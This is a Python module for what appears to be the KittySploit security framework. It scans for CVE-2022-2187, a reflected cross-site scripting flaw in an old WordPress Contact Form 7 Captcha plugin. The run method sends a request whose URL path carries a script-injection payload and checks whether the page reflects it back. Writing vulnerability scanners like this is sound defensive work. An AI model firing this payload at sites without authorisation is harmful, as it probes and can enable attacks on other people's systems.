#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Contact Form 7 Captcha plugin before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Contact Form 7 Captcha <0.1.2 - Cross-Site Scripting Detection',
        'description': "WordPress Contact Form 7 Captcha plugin before 0.1.2 contains a reflected cross-site scripting vulnerability. It does not escape the $_SERVER['REQUEST_URI'] parameter before outputting it back in an attribute.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wpscan', 'wordpress', 'xss', 'wp-plugin', 'wp', 'contact_form_7_captcha_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/4fd2f1ef-39c6-4425-8b4d-1a332dabac8d',
            'https://wordpress.org/plugins/contact-form-7-simple-recaptcha',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2187',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-2187',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/options-general.php?page=cf7sr_edit&"></script><script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('</script><script>alert(document.domain)</script>', 'Contact Form 7',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Contact Form 7 Captcha <0.1.2 - Cross-Site Scripting detected",
                path='/wp-admin/options-general.php?page=cf7sr_edit&"></script><script>alert(document.domain)</script>',
            )
            return True
        return False

